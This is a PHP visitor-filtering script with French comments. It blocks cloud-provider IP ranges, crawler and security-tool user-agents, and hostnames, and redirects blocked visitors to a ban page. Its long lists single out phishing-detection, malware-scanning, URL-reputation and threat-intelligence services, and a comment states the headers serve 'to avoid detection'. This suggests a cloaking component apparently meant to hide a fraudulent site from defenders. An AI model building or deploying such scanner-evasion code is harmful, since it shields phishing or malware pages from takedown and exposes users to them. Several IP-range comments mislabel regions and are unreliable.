<?php
declare(strict_types=1);

const BLOCK_REDIRECT = '../pages/ban.php';

if (!defined('WHITELIST_FILE')) {
    define('WHITELIST_FILE', __DIR__ . '/../config/whitelist.txt');
}
const CACHE_FILE     = __DIR__ . '/dns_cache.json';
if (!defined('CACHE_TTL')) {
    define('CACHE_TTL', 86400);
}

/* -------------------------------------------------------------------------- */
/* 🔹 Récupération de l’IP réelle */
/* -------------------------------------------------------------------------- */
function getRealIp(): string
{
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

/* -------------------------------------------------------------------------- */
/* 🔹 Conversion Wildcard → Regex */
/* -------------------------------------------------------------------------- */
function wildcardToRegex(string $pattern): string
{
    $regex = preg_quote($pattern, '/');
    $regex = str_replace('\*', '.*', $regex);
    return '/^' . $regex . '$/i';
}

/* -------------------------------------------------------------------------- */
/* 🔹 Vérification IP bloquée */
/* -------------------------------------------------------------------------- */
function isBlockedIp(string $ip, array $patterns): bool
{
    foreach ($patterns as $pattern) {
        if ($ip === $pattern) return true;
        if (strpos($pattern, '*') !== false && preg_match(wildcardToRegex($pattern), $ip)) {
            return true;
        }
    }
    return false;
}

/* -------------------------------------------------------------------------- */
/* 🔹 Vérification IPv4/IPv6 valide */
/* -------------------------------------------------------------------------- */
function isValidIp(string $ip): bool
{
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

/* -------------------------------------------------------------------------- */
/* 🔹 Vérification IP whitelist */
/* -------------------------------------------------------------------------- */
function isIpWhitelisted(string $ip, array $allowedIPs): bool
{
    foreach ($allowedIPs as $pattern) {
        if ($ip === $pattern) return true;
        if (strpos($pattern, '*') !== false && preg_match(wildcardToRegex($pattern), $ip)) {
            return true;
        }
    }
    return false;
}

/* -------------------------------------------------------------------------- */
/* 🔹 Vérification User-Agent bloqué */
/* -------------------------------------------------------------------------- */
function isBlockedUserAgent(string $ua, array $blockedUserAgents): bool
{
    $ua = strtolower($ua);
    foreach ($blockedUserAgents as $badUA) {
        if (stripos($ua, strtolower($badUA)) !== false) {
            return true;
        }
    }
    return false;
}

/* -------------------------------------------------------------------------- */
/* 🔹 Vérification Hostname bloqué (avec cache DNS) */
/* -------------------------------------------------------------------------- */
function isBlockedHostname(string $ip, array $blockedHostnames): bool
{
    if (!isValidIp($ip)) return false;

    $cache = file_exists(CACHE_FILE) ? json_decode(file_get_contents(CACHE_FILE), true) : [];
    $now   = time();

    if (isset($cache[$ip]) && ($now - $cache[$ip]['time'] < CACHE_TTL)) {
        $hostname = $cache[$ip]['host'];
    } else {
        $hostname = gethostbyaddr($ip);
        $cache[$ip] = ['host' => $hostname, 'time' => $now];
        file_put_contents(CACHE_FILE, json_encode($cache));
    }

    $hostname = strtolower($hostname);
    foreach ($blockedHostnames as $badHost) {
        if (strpos($hostname, strtolower($badHost)) !== false) {
            return true;
        }
    }
    return false;
}


$blockedIps = [
    // AWS (Amazon Web Services) - régions principales
    '13.52.*.*',       // US West (Oregon)
    '13.59.*.*',       // EU (Frankfurt)
    '13.224.*.*',      // US East (N. Virginia)
    '13.235.*.*',      // Asia Pacific (Mumbai)
    '18.196.*.*',      // US East (Ohio)
    '3.210.*.*',       // Asia Pacific (Tokyo)
    '52.95.*.*',       // US East (Ohio)

    // Microsoft Azure - régions clés
    '20.36.*.*',       // US East
    '20.50.*.*',       // US West
    '52.94.*.*',       // East US 2
    '40.112.*.*',      // West Europe
    '52.176.*.*',      // South Central US

    // Google Cloud Platform - plages larges
    '35.192.*.*',
    '35.196.*.*',
    '35.199.*.*',
    '130.211.*.*',
    '104.154.*.*',
    '104.198.*.*',

    // OVH
    '51.15.*.*',
    '51.158.*.*',
    '163.172.*.*',

    // Hetzner
    '138.201.*.*',
    '78.47.*.*',
    '95.216.*.*',

    // DigitalOcean
    '159.89.*.*',
    '178.62.*.*',
    '64.227.*.*',
    '46.101.*.*',
    '209.97.*.*',
    '104.236.*.*',

    // Vultr
    '198.211.*.*',
    '198.199.*.*',
    '104.248.*.*',
    '172.105.*.*',

    // Linode
    '139.162.*.*',
    '50.116.*.*',

    // Scaleway
    '51.91.*.*',
    '51.158.*.*',

    // IPs uniques suspectes (proxy, bots, scanners)
    '173.239.240.147',  // Proxy suspect
    '103.248.172.42',   // Proxy suspect
    '47.30.133.89',     // VPN / Proxy
    '185.191.171.17',   // Botnet
    '185.191.171.26',   // Botnet
    '185.191.171.38',   // Botnet
    '185.191.171.44',   // Botnet
    '185.191.171.45',   // Botnet
    '103.216.202.11',   // Proxy suspect
    '185.62.189.146',   // Botnet connu
    '194.67.37.90',     // Proxy / scanner connu
];



$blockedUserAgents = [
    // Mots-clés génériques
    'bot', 'spider', 'crawler', 'curl', 'wget', 'python', 'java', 'php',
    'go-http-client', 'libwww', 'scan', 'checker', 'masscan', 'acunetix',
    'netsparker', 'sqlmap', 'ahrefs', 'semrush', 'mj12bot', 'bingbot',
    'googlebot', 'yandex', 'baiduspider', 'facebookexternalhit',
    'discordbot', 'telegrambot', 'scrapy', 'node-fetch', 'axios',
    'headless', 'lighthouse', 'pagespeed', 'zgrab', 'shodan', 'censys',
    'whatweb', 'wpscan', 'dirbuster', 'nikto', 'uptime', 'pingdom',
    'cybercrimetracker', 'netcraft', 'grequests', 'java/', 'go/',   
    'httpclient', 'okhttp', 'python-requests', 'fetch/', 'httpie',  
    'morfeus', 'masscan', 'sqlninja', 'fimap', 'nmap', 'acunetix',
    'nessus', 'fiddler', 'httpdebug', 'fuzzer', 'webinspect', 'dirbuster',
    'puppeteer', 'playwright', 'selenium', 'mechanize', 'phantomjs',
    'postman', 'insomnia', 'restsharp', 'aiohttp', 'requests',
    'nuclei', 'gobuster', 'wfuzz', 'burp', 'zap', 'nessus', 'openvas',
    'applebot', 'embedly', 'flipboard', 'linkedinbot', 'outbrain', 'pinterest', 'quora link preview',
    'slackbot', 'whatsapp', 'telegram', 'discord', 'facebook', 'twitter',
    'instagram', 'tiktok', 'snapchat', 'youtube', 'twitch', 'reddit',
    'amazonbot', 'bytespider', 'ccbot', 'pinterestbot', 'qwantbot',
    'archive.org_bot', 'petalbot', 'searchmetricsbot', 'seokicks-robot',
    'trendictionbot', 'semrush', 'uptime', 'crawler4j', 'google llc', 'cloudflare',
    'k6', 'loader.io', 'newrelicpinger', 'statuscake', 'uptimerobot',
    'httpunit', 'capybara', 'htmlunit', 'nutch', 'mechanize', 'postmanruntime',
    'powershell', 'http_request2', 'lwp::simple', 'urllib', 'httpie',
    'fetch', 'headless', 'phantomjs', 'selenium', 'mechanize', 'postmanruntime',
    'httpunit', 'capybara', 'puppeteer', 'playwright', 'nutch', 'htmlunit',
    'k6', 'loader.io', 'newrelicpinger', 'statuscake', 'uptimerobot',
    'facebookexternalhit', 'facebot', 'facebookbot', 'instagram', 'whatsapp',
    'twitterbot', 'slackbot', 'discordbot', 'telegrambot', 'linkedinbot',
    'googlebot', 'adsbot-google', 'mediapartners-google', 'apis-google',
    'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot', 'sogou',
    'exabot', 'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'zoominfobot',
    'google-structured-data-testing-tool', 'siteauditbot', 'amazonbot',
    'bytespider', 'ccbot', 'pinterestbot', 'yahoo! slurp', 'qwantbot',
    'archive.org_bot', 'petalbot', 'searchmetricsbot', 'seokicks-robot',
    'trendictionbot', 'semrush', 'uptime', 'crawler4j', 'google llc', 'cloudflare',
    'nmap', 'nikto', 'hydra', 'sqlmap', 'burp', 'zap', 'nessus', 'openvas',
    'masscan', 'zmap', 'nuclei', 'gobuster', 'dirb', 'dirbuster', 'wfuzz',
    // Scanners spécifiques Seclookup et similaires
    'seclookup', 'security lookup', 'threat intelligence', 'malware detection',
    'phishing detection', 'url scanner', 'domain scanner', 'reputation check',
    'threat analysis', 'security check', 'malware scanner', 'phishing scanner',
    'url analyzer', 'domain analyzer', 'security analyzer', 'threat scanner',
    'malware analyzer', 'phishing analyzer', 'url checker', 'domain checker',
    'security checker', 'threat checker', 'malware checker', 'phishing checker',
    'abuse intelligence', 'threat hunting', 'security monitoring', 'malware analysis',
    'phishing analysis', 'url analysis', 'domain analysis', 'security monitoring',
    'threat monitoring', 'malware monitoring', 'phishing monitoring', 'url monitoring',
    'domain monitoring', 'security scanning', 'threat scanning', 'malware scanning',
    'phishing scanning', 'url scanning', 'domain scanning'
];


$blockedHostnames = [
    // Bots, crawlers, spiders, scanners
    "bot", "crawler", "spider", "scanner", "proxy", "vpn", "anonymizer", "tor-exit", "tor-node", "tor-relay",
    "scanner", "sqlmap", "nikto", "nessus", "acunetix", "netsparker", "wpscan", "nmap", "masscan", "zaproxy", "burp",

    // Services Cloud et fournisseurs d'hébergement souvent utilisés par bots ou proxys
    "amazonaws", "aws", "azure", "google-cloud", "digitalocean", "linode", "vultr", "ovh", "hetzner",
    "scaleway", "rackspace", "dreamhost", "fastly", "cdn77", "cdn77.net", "akamai", "maxcdn",

    // Réseaux anonymes et VPN connus
    "hide.me", "hidemyass", "privoxy", "privatelayer", "expressvpn", "nordvpn", "surfshark", "cyberghost", "protonvpn",
    "windscribe", "ipvanish", "purevpn", "torguard", "vpnbook",

    // Bots SEO et scraping agressifs
    "ahrefs", "semrush", "majestic", "mj12bot", "seznambot", "dotbot", "sistrix", "blexbot", "bingbot", "yandex", "baiduspider",
    "facebot", "facebookexternalhit", "twitterbot", "linkedinbot",

    // Messageries et bots réseaux sociaux douteux
    "telegrambot", "discordbot", "slackbot", "whatsapp", "linebot", "vkshare",

    // Proxies & anonymisateurs divers
    "proxy", "proxifier", "sockproxy", "socks", "transparentproxy", "openproxy", "anonymousproxy", "vpnproxy",

    // Serveurs mail & spam suspects (optionnel)
    "smtp", "mail", "mx.", "email.", "postfix", "exim", "sendmail",

    // Hébergeurs et services associés potentiellement abusés
    "herokuapp", "fly.io", "render.com", "zeit.co", "vercel.app",

    // Termes divers liés à la sécurité offensive
    "exploit", "hack", "attack", "brute", "dos", "ddos", "flood", "intrusion", "scanner",

    // Miscellaneous potentiellement malveillants
    "botnet", "crawler", "spambot", "scraper", "spammer", "malware", "ransomware",
    
    // Scanners spécifiques Seclookup et similaires
    "seclookup", "security lookup", "threat intelligence", "malware detection",
    "phishing detection", "url scanner", "domain scanner", "reputation check",
    "threat analysis", "security check", "malware scanner", "phishing scanner",
    "url analyzer", "domain analyzer", "security analyzer", "threat scanner",
    "malware analyzer", "phishing analyzer", "url checker", "domain checker",
    "security checker", "threat checker", "malware checker", "phishing checker",
    "abuse intelligence", "threat hunting", "security monitoring", "malware analysis",
    "phishing analysis", "url analysis", "domain analysis", "security monitoring",
    "threat monitoring", "malware monitoring", "phishing monitoring", "url monitoring",
    "domain monitoring", "security scanning", "threat scanning", "malware scanning",
    "phishing scanning", "url scanning", "domain scanning",
    // Patterns supplémentaires pour détecter plus de scanners
    "abuse intelligence", "threat hunting", "security monitoring", "malware analysis",
    "phishing analysis", "url analysis", "domain analysis", "security monitoring",
    "threat monitoring", "malware monitoring", "phishing monitoring", "url monitoring",
    "domain monitoring", "security scanning", "threat scanning", "malware scanning",
    "phishing scanning", "url scanning", "domain scanning",
    // Patterns pour détecter les scanners de sécurité spécifiques
    "seclookup", "security lookup", "threat intelligence", "malware detection",
    "phishing detection", "url scanner", "domain scanner", "reputation check",
    "threat analysis", "security check", "malware scanner", "phishing scanner",
    "url analyzer", "domain analyzer", "security analyzer", "threat scanner",
    "malware analyzer", "phishing analyzer", "url checker", "domain checker",
    "security checker", "threat checker", "malware checker", "phishing checker",
    // Patterns pour détecter les scanners de sécurité supplémentaires
    "abuse intelligence", "threat hunting", "security monitoring", "malware analysis",
    "phishing analysis", "url analysis", "domain analysis", "security monitoring",
    "threat monitoring", "malware monitoring", "phishing monitoring", "url monitoring",
    "domain monitoring", "security scanning", "threat scanning", "malware scanning",
    "phishing scanning", "url scanning", "domain scanning"
];







/* -------------------------------------------------------------------------- */
/* 🔹 Détection finale */
/* -------------------------------------------------------------------------- */
$ip = getRealIp();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (!isValidIp($ip)) {
    http_response_code(400);
    exit('Invalid IP');
}

// 📂 Chargement whitelist
$allowedIPs = file_exists(WHITELIST_FILE)
    ? array_map('trim', file(WHITELIST_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))
    : [];

// ✅ Skip si IP whitelistée
if (isIpWhitelisted($ip, $allowedIPs)) {
    return;
}

// 🧱 Vérifications anti-bot RENFORCÉES
$isBlocked = false;
$blockReason = '';

// 1. Vérification IP
if (isBlockedIp($ip, $blockedIps)) {
    $isBlocked = true;
    $blockReason = 'IP bloquée';
}

// 2. Vérification User-Agent
if (!$isBlocked && isBlockedUserAgent($ua, $blockedUserAgents)) {
    $isBlocked = true;
    $blockReason = 'User-Agent suspect';
}

// 3. Vérification hostname (désactivée pour Cloudflare)
if (!$isBlocked && isBlockedHostname($ip, $blockedHostnames)) {
    $isBlocked = true;
    $blockReason = 'Hostname suspect';
}

// 4. NOUVELLE VÉRIFICATION : Cohérence des headers
if (!$isBlocked) {
    // Vérifier la présence des headers essentiels
    if (!isset($_SERVER['HTTP_ACCEPT']) || empty($_SERVER['HTTP_ACCEPT'])) {
        $isBlocked = true;
        $blockReason = 'Header Accept manquant';
    }
    
    if (!$isBlocked && (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_ACCEPT_LANGUAGE']))) {
        $isBlocked = true;
        $blockReason = 'Header Accept-Language manquant';
    }
    
    // Vérifier la cohérence des headers
    if (!$isBlocked && isset($_SERVER['HTTP_ACCEPT']) && !preg_match('/text\/html|application\/xhtml|application\/xml/', $_SERVER['HTTP_ACCEPT'])) {
        $isBlocked = true;
        $blockReason = 'Header Accept suspect';
    }
}

if ($isBlocked) {
    // Log détaillé du blocage
    $logEntry = sprintf(
        "[%s] BLOCKED | IP: %s | UA: %s | Reason: %s | Headers: Accept=%s, Accept-Lang=%s\n",
        date('Y-m-d H:i:s'),
        $ip,
        $ua,
        $blockReason,
        $_SERVER['HTTP_ACCEPT'] ?? 'NONE',
        $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'NONE'
    );
    
    // Log dans le fichier de bannissement
    file_put_contents(__DIR__ . '/../logs/banned_visits.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Log dans un fichier spécifique pour les tentatives de contournement
    file_put_contents(__DIR__ . '/../logs/contournement_attempts.log', $logEntry, FILE_APPEND | LOCK_EX);
    
    if (defined('BLOCK_REDIRECT') && BLOCK_REDIRECT !== '') {
        // Headers de sécurité pour éviter la détection
        header('HTTP/1.1 200 OK');
        header('X-Content-Type-Options: nosniff');
        header('X-Frame-Options: DENY');
        header('X-XSS-Protection: 1; mode=block');
        header('Referrer-Policy: strict-origin-when-cross-origin');
        header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        header('Location: ' . BLOCK_REDIRECT);
    } else {
        http_response_code(403);
        echo 'Forbidden';
    }
    exit;
}
